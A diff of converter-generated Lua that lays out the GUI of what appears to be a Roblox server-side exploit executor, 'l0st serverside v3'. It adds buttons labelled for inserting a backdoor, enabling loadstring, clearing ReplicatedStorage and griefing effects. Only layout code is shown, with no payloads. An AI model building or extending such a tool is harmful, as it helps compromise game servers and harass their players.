@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 76 | Scripts: 21 | Modules: 0 | Tags: 0
+-- Instances: 83 | Scripts: 21 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.ScreenGui
@@ -62,7 +62,7 @@ G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["7"]["BackgroundTransparency"] = 1;
 G2L["7"]["Size"] = UDim2.new(0, 394, 0, 26);
 G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["7"]["Text"] = [[l0stSS Serverside V3 by team l0stk1dd88]];
+G2L["7"]["Text"] = [[l0st serverside v3]];
 G2L["7"]["Position"] = UDim2.new(0.04317, 0, 0, 0);
 
 
@@ -70,8 +70,8 @@ G2L["7"]["Position"] = UDim2.new(0.04317, 0, 0, 0);
 G2L["8"] = Instance.new("Frame", G2L["6"]);
 G2L["8"]["BorderSizePixel"] = 0;
 G2L["8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["8"]["Size"] = UDim2.new(0, 417, 0, 10);
-G2L["8"]["Position"] = UDim2.new(0, 0, -0.20833, 0);
+G2L["8"]["Size"] = UDim2.new(0, 430, 0, 10);
+G2L["8"]["Position"] = UDim2.new(-0.01679, 0, -0.20833, 0);
 G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 
 
@@ -93,6 +93,7 @@ G2L["a"]["TextWrapped"] = true;
 G2L["a"]["TextSize"] = 14;
 G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["a"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["a"]["TextScaled"] = true;
 G2L["a"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
 G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["a"]["Size"] = UDim2.new(0, 390, 0, 186);
@@ -116,11 +117,11 @@ G2L["d"] = Instance.new("ScrollingFrame", G2L["4"]);
 G2L["d"]["Active"] = true;
 G2L["d"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
 G2L["d"]["BorderSizePixel"] = 0;
+G2L["d"]["CanvasPosition"] = Vector2.new(0, 936);
 G2L["d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["d"]["Name"] = [[ScriptHubFrame]];
 G2L["d"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
 G2L["d"]["Size"] = UDim2.new(0, 98, 0, 319);
-G2L["d"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["d"]["Position"] = UDim2.new(1.01439, 0, -0.03378, 0);
 G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["d"]["ScrollBarThickness"] = 10;
@@ -589,124 +590,182 @@ G2L["2c"]["Name"] = [[anchor]];
 G2L["2c"]["Position"] = UDim2.new(0, 0, 3.04702, 0);
 
 
--- StarterGui.ScreenGui.Frame.Execute
-G2L["2d"] = Instance.new("ImageButton", G2L["4"]);
+-- StarterGui.ScreenGui.Frame.ScriptHubFrame.clearrs
+G2L["2d"] = Instance.new("TextButton", G2L["d"]);
+G2L["2d"]["TextWrapped"] = true;
 G2L["2d"]["BorderSizePixel"] = 0;
--- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
-G2L["2d"]["Image"] = [[rbxassetid://12099513379]];
-G2L["2d"]["Size"] = UDim2.new(0, 50, 0, 50);
+G2L["2d"]["TextSize"] = 14;
+G2L["2d"]["TextScaled"] = true;
+G2L["2d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(40, 40, 40);
+G2L["2d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2d"]["Size"] = UDim2.new(0, 90, 0, 31);
 G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2d"]["Name"] = [[Execute]];
-G2L["2d"]["Position"] = UDim2.new(0.05036, 0, 0.78378, 0);
+G2L["2d"]["Text"] = [[Clear ReplicatedStorage]];
+G2L["2d"]["Name"] = [[clearrs]];
+G2L["2d"]["Position"] = UDim2.new(0, 0, 1.69279, 0);
+
+
+-- StarterGui.ScreenGui.Frame.ScriptHubFrame.backdoor
+G2L["2e"] = Instance.new("TextButton", G2L["d"]);
+G2L["2e"]["TextWrapped"] = true;
+G2L["2e"]["BorderSizePixel"] = 0;
+G2L["2e"]["TextSize"] = 14;
+G2L["2e"]["TextScaled"] = true;
+G2L["2e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(40, 40, 40);
+G2L["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2e"]["Size"] = UDim2.new(0, 90, 0, 31);
+G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e"]["Text"] = [[Insert a Backdoor]];
+G2L["2e"]["Name"] = [[backdoor]];
+G2L["2e"]["Position"] = UDim2.new(0, 0, 0.56426, 0);
+
+
+-- StarterGui.ScreenGui.Frame.ScriptHubFrame.loadstring
+G2L["2f"] = Instance.new("TextButton", G2L["d"]);
+G2L["2f"]["TextWrapped"] = true;
+G2L["2f"]["BorderSizePixel"] = 0;
+G2L["2f"]["TextSize"] = 14;
+G2L["2f"]["TextScaled"] = true;
+G2L["2f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(40, 40, 40);
+G2L["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f"]["Size"] = UDim2.new(0, 90, 0, 31);
+G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f"]["Text"] = [[Enable loadstring]];
+G2L["2f"]["Name"] = [[loadstring]];
+G2L["2f"]["Position"] = UDim2.new(0, 0, 1.69279, 0);
+
+
+-- StarterGui.ScreenGui.Frame.ScriptHubFrame.fire
+G2L["30"] = Instance.new("TextButton", G2L["d"]);
+G2L["30"]["TextWrapped"] = true;
+G2L["30"]["BorderSizePixel"] = 0;
+G2L["30"]["TextSize"] = 14;
+G2L["30"]["TextScaled"] = true;
+G2L["30"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["30"]["BackgroundColor3"] = Color3.fromRGB(40, 40, 40);
+G2L["30"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["30"]["Size"] = UDim2.new(0, 90, 0, 31);
+G2L["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["30"]["Text"] = [[Burn all Parts]];
+G2L["30"]["Name"] = [[fire]];
+G2L["30"]["Position"] = UDim2.new(0, 0, 1.80564, 0);
+
+
+-- StarterGui.ScreenGui.Frame.ScriptHubFrame.firering
+G2L["31"] = Instance.new("TextButton", G2L["d"]);
+G2L["31"]["TextWrapped"] = true;
+G2L["31"]["BorderSizePixel"] = 0;
+G2L["31"]["TextSize"] = 14;
+G2L["31"]["TextScaled"] = true;
+G2L["31"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["31"]["BackgroundColor3"] = Color3.fromRGB(40, 40, 40);
+G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["31"]["Size"] = UDim2.new(0, 90, 0, 31);
+G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["31"]["Text"] = [[Ring of Fire]];
+G2L["31"]["Name"] = [[firering]];
+G2L["31"]["Position"] = UDim2.new(0, 0, 1.24138, 0);
+
+
+-- StarterGui.ScreenGui.Frame.ScriptHubFrame.fireringall
+G2L["32"] = Instance.new("TextButton", G2L["d"]);
+G2L["32"]["TextWrapped"] = true;
+G2L["32"]["BorderSizePixel"] = 0;
+G2L["32"]["TextSize"] = 14;
+G2L["32"]["TextScaled"] = true;
+G2L["32"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["32"]["BackgroundColor3"] = Color3.fromRGB(40, 40, 40);
+G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["32"]["Size"] = UDim2.new(0, 90, 0, 31);
+G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["32"]["Text"] = [[Ring of Fire All]];
+G2L["32"]["Name"] = [[fireringall]];
+G2L["32"]["Position"] = UDim2.new(0, 0, 1.46708, 0);
+
+
+-- StarterGui.ScreenGui.Frame.ScriptHubFrame.meteor
+G2L["33"] = Instance.new("TextButton", G2L["d"]);
+G2L["33"]["TextWrapped"] = true;
+G2L["33"]["BorderSizePixel"] = 0;
+G2L["33"]["TextSize"] = 14;
+G2L["33"]["TextScaled"] = true;
+G2L["33"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["33"]["BackgroundColor3"] = Color3.fromRGB(40, 40, 40);
+G2L["33"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["33"]["Size"] = UDim2.new(0, 90, 0, 31);
+G2L["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["33"]["Text"] = [[Meteor Shower]];
+G2L["33"]["Name"] = [[meteor]];
+G2L["33"]["Position"] = UDim2.new(0, 0, 1.24138, 0);
+
+
+-- StarterGui.ScreenGui.Frame.Execute
+G2L["34"] = Instance.new("ImageButton", G2L["4"]);
+G2L["34"]["BorderSizePixel"] = 0;
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["34"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
+G2L["34"]["Image"] = [[rbxassetid://12099513379]];
+G2L["34"]["Size"] = UDim2.new(0, 50, 0, 50);
+G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["34"]["Name"] = [[Execute]];
+G2L["34"]["Position"] = UDim2.new(0.05036, 0, 0.78378, 0);
 
 
 -- StarterGui.ScreenGui.Frame.Execute.LocalScript
-G2L["2e"] = Instance.new("LocalScript", G2L["2d"]);
+G2L["35"] = Instance.new("LocalScript", G2L["34"]);
 
 
 
 -- StarterGui.ScreenGui.Frame.Clear
-G2L["2f"] = Instance.new("ImageButton", G2L["4"]);
-G2L["2f"]["BorderSizePixel"] = 0;
--- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
-G2L["2f"]["Image"] = [[rbxassetid://9348208337]];
-G2L["2f"]["Size"] = UDim2.new(0, 50, 0, 50);
-G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2f"]["Name"] = [[Clear]];
-G2L["2f"]["Position"] = UDim2.new(0.19664, 0, 0.78378, 0);
-
-
--- StarterGui.ScreenGui.Frame.Clear.LocalScript
-G2L["30"] = Instance.new("LocalScript", G2L["2f"]);
-
-
-
--- StarterGui.ScreenGui.Frame.Inject
-G2L["31"] = Instance.new("ImageButton", G2L["4"]);
-G2L["31"]["BorderSizePixel"] = 0;
--- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["31"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
-G2L["31"]["Image"] = [[rbxassetid://136911114506878]];
-G2L["31"]["Size"] = UDim2.new(0, 50, 0, 50);
-G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["31"]["Name"] = [[Inject]];
-G2L["31"]["Position"] = UDim2.new(0.86811, 0, 0.78378, 0);
-
-
--- StarterGui.ScreenGui.Frame.Inject.LocalScript
-G2L["32"] = Instance.new("LocalScript", G2L["31"]);
-
-
-
--- StarterGui.ScreenGui.Frame.Inject.LocalScript
-G2L["33"] = Instance.new("LocalScript", G2L["31"]);
-
-
-
--- StarterGui.ScreenGui.Frame.Inject.LocalScript
-G2L["34"] = Instance.new("LocalScript", G2L["31"]);
-
-
-
--- StarterGui.ScreenGui.Frame.Inject.LocalScript
-G2L["35"] = Instance.new("LocalScript", G2L["31"]);
-
-
-
--- StarterGui.ScreenGui.Frame.ImageButton
 G2L["36"] = Instance.new("ImageButton", G2L["4"]);
 G2L["36"]["BorderSizePixel"] = 0;
 -- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["36"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
-G2L["36"]["ZIndex"] = 2;
-G2L["36"]["Image"] = [[rbxassetid://12099513379]];
-G2L["36"]["Size"] = UDim2.new(0, 34, 0, 36);
-G2L["36"]["BorderColor3"] = Color3.fromRGB(27, 27, 27);
-G2L["36"]["Position"] = UDim2.new(-0.07434, 0, 0.625, 0);
+G2L["36"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
+G2L["36"]["Image"] = [[rbxassetid://9348208337]];
+G2L["36"]["Size"] = UDim2.new(0, 50, 0, 50);
+G2L["36"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["36"]["Name"] = [[Clear]];
+G2L["36"]["Position"] = UDim2.new(0.19664, 0, 0.78378, 0);
 
 
--- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+-- StarterGui.ScreenGui.Frame.Clear.LocalScript
 G2L["37"] = Instance.new("LocalScript", G2L["36"]);
 
 
 
--- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-G2L["38"] = Instance.new("LocalScript", G2L["36"]);
-
-
-
--- StarterGui.ScreenGui.Frame.ImageButton
-G2L["39"] = Instance.new("ImageButton", G2L["4"]);
-G2L["39"]["BorderSizePixel"] = 0;
+-- StarterGui.ScreenGui.Frame.Inject
+G2L["38"] = Instance.new("ImageButton", G2L["4"]);
+G2L["38"]["BorderSizePixel"] = 0;
 -- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["39"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
-G2L["39"]["ZIndex"] = 2;
-G2L["39"]["Image"] = [[rbxassetid://7128117167]];
-G2L["39"]["Size"] = UDim2.new(0, 40, 0, 36);
-G2L["39"]["BorderColor3"] = Color3.fromRGB(27, 27, 27);
-G2L["39"]["Position"] = UDim2.new(-0.07914, 0, 0.4527, 0);
+G2L["38"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
+G2L["38"]["Image"] = [[rbxassetid://136911114506878]];
+G2L["38"]["Size"] = UDim2.new(0, 50, 0, 50);
+G2L["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["38"]["Name"] = [[Inject]];
+G2L["38"]["Position"] = UDim2.new(0.86811, 0, 0.78378, 0);
 
 
--- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-G2L["3a"] = Instance.new("LocalScript", G2L["39"]);
-
-
-
--- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-G2L["3b"] = Instance.new("LocalScript", G2L["39"]);
+-- StarterGui.ScreenGui.Frame.Inject.LocalScript
+G2L["39"] = Instance.new("LocalScript", G2L["38"]);
 
 
 
--- StarterGui.ScreenGui.Frame.Line
-G2L["3c"] = Instance.new("Frame", G2L["4"]);
-G2L["3c"]["BorderSizePixel"] = 0;
-G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
-G2L["3c"]["Size"] = UDim2.new(0, 417, 0, 13);
-G2L["3c"]["Position"] = UDim2.new(0, 0, 1, 0);
-G2L["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3c"]["Name"] = [[Line]];
+-- StarterGui.ScreenGui.Frame.Inject.LocalScript
+G2L["3a"] = Instance.new("LocalScript", G2L["38"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.Inject.LocalScript
+G2L["3b"] = Instance.new("LocalScript", G2L["38"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.Inject.LocalScript
+G2L["3c"] = Instance.new("LocalScript", G2L["38"]);
+
 
 
 -- StarterGui.ScreenGui.Frame.ImageButton
@@ -715,10 +774,10 @@ G2L["3d"]["BorderSizePixel"] = 0;
 -- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
 G2L["3d"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
 G2L["3d"]["ZIndex"] = 2;
-G2L["3d"]["Image"] = [[rbxassetid://96996641562298]];
-G2L["3d"]["Size"] = UDim2.new(0, 40, 0, 36);
+G2L["3d"]["Image"] = [[rbxassetid://12099513379]];
+G2L["3d"]["Size"] = UDim2.new(0, 34, 0, 36);
 G2L["3d"]["BorderColor3"] = Color3.fromRGB(27, 27, 27);
-G2L["3d"]["Position"] = UDim2.new(-0.07914, 0, 0.16216, 0);
+G2L["3d"]["Position"] = UDim2.new(-0.07434, 0, 0.625, 0);
 
 
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
@@ -731,139 +790,193 @@ G2L["3f"] = Instance.new("LocalScript", G2L["3d"]);
 
 
 
--- StarterGui.ScreenGui.Frame.Line
-G2L["40"] = Instance.new("Frame", G2L["4"]);
+-- StarterGui.ScreenGui.Frame.ImageButton
+G2L["40"] = Instance.new("ImageButton", G2L["4"]);
 G2L["40"]["BorderSizePixel"] = 0;
-G2L["40"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
-G2L["40"]["Size"] = UDim2.new(0, 33, 0, 310);
-G2L["40"]["Position"] = UDim2.new(-0.07914, 0, -0.03378, 0);
-G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["40"]["Name"] = [[Line]];
-
-
--- StarterGui.ScreenGui.Frame.Line.Line
-G2L["41"] = Instance.new("Frame", G2L["40"]);
-G2L["41"]["BorderSizePixel"] = 0;
-G2L["41"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["41"]["Size"] = UDim2.new(0, 33, 0, 9);
-G2L["41"]["Position"] = UDim2.new(0, 0, 0.00308, 0);
-G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["41"]["Name"] = [[Line]];
-
-
--- StarterGui.ScreenGui.Frame.Line.ImageLabel
-G2L["42"] = Instance.new("ImageLabel", G2L["40"]);
-G2L["42"]["ZIndex"] = 10;
-G2L["42"]["BorderSizePixel"] = 0;
-G2L["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 -- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["42"]["Image"] = [[rbxassetid://81013369562879]];
-G2L["42"]["Size"] = UDim2.new(0, 45, 0, 41);
-G2L["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["42"]["BackgroundTransparency"] = 1;
-G2L["42"]["Position"] = UDim2.new(-0.09091, 0, 0.03077, 0);
+G2L["40"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
+G2L["40"]["ZIndex"] = 2;
+G2L["40"]["Image"] = [[rbxassetid://7128117167]];
+G2L["40"]["Size"] = UDim2.new(0, 40, 0, 36);
+G2L["40"]["BorderColor3"] = Color3.fromRGB(27, 27, 27);
+G2L["40"]["Position"] = UDim2.new(-0.07914, 0, 0.4527, 0);
 
 
--- StarterGui.ScreenGui.Frame.Line.Frame
-G2L["43"] = Instance.new("Frame", G2L["40"]);
-G2L["43"]["ZIndex"] = 1111111111;
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+G2L["41"] = Instance.new("LocalScript", G2L["40"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+G2L["42"] = Instance.new("LocalScript", G2L["40"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.Line
+G2L["43"] = Instance.new("Frame", G2L["4"]);
 G2L["43"]["BorderSizePixel"] = 0;
-G2L["43"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["43"]["Size"] = UDim2.new(0, 47, 0, 10);
-G2L["43"]["Position"] = UDim2.new(-0.13473, 0, 0.16237, 0);
+G2L["43"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
+G2L["43"]["Size"] = UDim2.new(0, 417, 0, 13);
+G2L["43"]["Position"] = UDim2.new(0, 0, 1, 0);
 G2L["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["43"]["Name"] = [[Line]];
 
 
--- StarterGui.ScreenGui.Frame.Line
-G2L["44"] = Instance.new("Frame", G2L["4"]);
-G2L["44"]["ZIndex"] = 3;
+-- StarterGui.ScreenGui.Frame.ImageButton
+G2L["44"] = Instance.new("ImageButton", G2L["4"]);
 G2L["44"]["BorderSizePixel"] = 0;
-G2L["44"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["44"]["Size"] = UDim2.new(0, 7, 0, 319);
-G2L["44"]["Position"] = UDim2.new(0.01679, 0, -0.03378, 0);
-G2L["44"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["44"]["Name"] = [[Line]];
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["44"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
+G2L["44"]["ZIndex"] = 2;
+G2L["44"]["Image"] = [[rbxassetid://96996641562298]];
+G2L["44"]["Size"] = UDim2.new(0, 40, 0, 36);
+G2L["44"]["BorderColor3"] = Color3.fromRGB(27, 27, 27);
+G2L["44"]["Position"] = UDim2.new(-0.07914, 0, 0.16216, 0);
 
 
--- StarterGui.ScreenGui.Frame.Line
-G2L["45"] = Instance.new("Frame", G2L["4"]);
-G2L["45"]["ZIndex"] = 3;
-G2L["45"]["BorderSizePixel"] = 0;
-G2L["45"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["45"]["Size"] = UDim2.new(0, 8, 0, 319);
-G2L["45"]["Position"] = UDim2.new(-0.09832, 0, -0.03378, 0);
-G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["45"]["Name"] = [[Line]];
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+G2L["45"] = Instance.new("LocalScript", G2L["44"]);
 
 
--- StarterGui.ScreenGui.Frame.Line
-G2L["46"] = Instance.new("Frame", G2L["4"]);
-G2L["46"]["ZIndex"] = 3;
-G2L["46"]["BorderSizePixel"] = 0;
-G2L["46"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["46"]["Size"] = UDim2.new(0, 464, 0, 9);
-G2L["46"]["Position"] = UDim2.new(-0.09832, 0, 1.01351, 0);
-G2L["46"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["46"]["Name"] = [[Line]];
+
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+G2L["46"] = Instance.new("LocalScript", G2L["44"]);
+
 
 
 -- StarterGui.ScreenGui.Frame.Line
 G2L["47"] = Instance.new("Frame", G2L["4"]);
-G2L["47"]["ZIndex"] = 3;
 G2L["47"]["BorderSizePixel"] = 0;
-G2L["47"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["47"]["Size"] = UDim2.new(0, -6, 0, 319);
-G2L["47"]["Position"] = UDim2.new(1.01439, 0, -0.03378, 0);
+G2L["47"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
+G2L["47"]["Size"] = UDim2.new(0, 33, 0, 310);
+G2L["47"]["Position"] = UDim2.new(-0.07914, 0, -0.03378, 0);
 G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["47"]["Name"] = [[Line]];
 
 
--- StarterGui.ScreenGui.Frame.ImageButton
-G2L["48"] = Instance.new("ImageButton", G2L["4"]);
+-- StarterGui.ScreenGui.Frame.Line.Line
+G2L["48"] = Instance.new("Frame", G2L["47"]);
 G2L["48"]["BorderSizePixel"] = 0;
+G2L["48"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["48"]["Size"] = UDim2.new(0, 61, 0, 10);
+G2L["48"]["Position"] = UDim2.new(-0.24242, 0, 0, 0);
+G2L["48"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["48"]["Name"] = [[Line]];
+
+
+-- StarterGui.ScreenGui.Frame.Line.ImageLabel
+G2L["49"] = Instance.new("ImageLabel", G2L["47"]);
+G2L["49"]["ZIndex"] = 10;
+G2L["49"]["BorderSizePixel"] = 0;
+G2L["49"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 -- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["48"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
-G2L["48"]["ZIndex"] = 2;
-G2L["48"]["Image"] = [[rbxassetid://12935062141]];
-G2L["48"]["Size"] = UDim2.new(0, 40, 0, 39);
-G2L["48"]["BorderColor3"] = Color3.fromRGB(27, 27, 27);
-G2L["48"]["Position"] = UDim2.new(-0.07914, 0, 0.30405, 0);
+G2L["49"]["Image"] = [[rbxassetid://81013369562879]];
+G2L["49"]["Size"] = UDim2.new(0, 45, 0, 41);
+G2L["49"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["49"]["BackgroundTransparency"] = 1;
+G2L["49"]["Position"] = UDim2.new(-0.09091, 0, 0.02903, 0);
+
+
+-- StarterGui.ScreenGui.Frame.Line.Frame
+G2L["4a"] = Instance.new("Frame", G2L["47"]);
+G2L["4a"]["ZIndex"] = 1111111111;
+G2L["4a"]["BorderSizePixel"] = 0;
+G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4a"]["Size"] = UDim2.new(0, 47, 0, 10);
+G2L["4a"]["Position"] = UDim2.new(-0.13473, 0, 0.16237, 0);
+G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+
+
+-- StarterGui.ScreenGui.Frame.Line
+G2L["4b"] = Instance.new("Frame", G2L["4"]);
+G2L["4b"]["ZIndex"] = 3;
+G2L["4b"]["BorderSizePixel"] = 0;
+G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4b"]["Size"] = UDim2.new(0, 7, 0, 319);
+G2L["4b"]["Position"] = UDim2.new(0.01679, 0, -0.03378, 0);
+G2L["4b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4b"]["Name"] = [[Line]];
+
+
+-- StarterGui.ScreenGui.Frame.Line
+G2L["4c"] = Instance.new("Frame", G2L["4"]);
+G2L["4c"]["ZIndex"] = 3;
+G2L["4c"]["BorderSizePixel"] = 0;
+G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4c"]["Size"] = UDim2.new(0, 8, 0, 319);
+G2L["4c"]["Position"] = UDim2.new(-0.09832, 0, -0.03378, 0);
+G2L["4c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4c"]["Name"] = [[Line]];
+
+
+-- StarterGui.ScreenGui.Frame.Line
+G2L["4d"] = Instance.new("Frame", G2L["4"]);
+G2L["4d"]["ZIndex"] = 3;
+G2L["4d"]["BorderSizePixel"] = 0;
+G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4d"]["Size"] = UDim2.new(0, 464, 0, 9);
+G2L["4d"]["Position"] = UDim2.new(-0.09832, 0, 1.01351, 0);
+G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4d"]["Name"] = [[Line]];
+
+
+-- StarterGui.ScreenGui.Frame.Line
+G2L["4e"] = Instance.new("Frame", G2L["4"]);
+G2L["4e"]["ZIndex"] = 3;
+G2L["4e"]["BorderSizePixel"] = 0;
+G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4e"]["Size"] = UDim2.new(0, -6, 0, 319);
+G2L["4e"]["Position"] = UDim2.new(1.01439, 0, -0.03378, 0);
+G2L["4e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4e"]["Name"] = [[Line]];
+
+
+-- StarterGui.ScreenGui.Frame.ImageButton
+G2L["4f"] = Instance.new("ImageButton", G2L["4"]);
+G2L["4f"]["BorderSizePixel"] = 0;
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
+G2L["4f"]["ZIndex"] = 2;
+G2L["4f"]["Image"] = [[rbxassetid://12935062141]];
+G2L["4f"]["Size"] = UDim2.new(0, 40, 0, 39);
+G2L["4f"]["BorderColor3"] = Color3.fromRGB(27, 27, 27);
+G2L["4f"]["Position"] = UDim2.new(-0.07914, 0, 0.30405, 0);
 
 
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-G2L["49"] = Instance.new("LocalScript", G2L["48"]);
+G2L["50"] = Instance.new("LocalScript", G2L["4f"]);
 
 
 
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
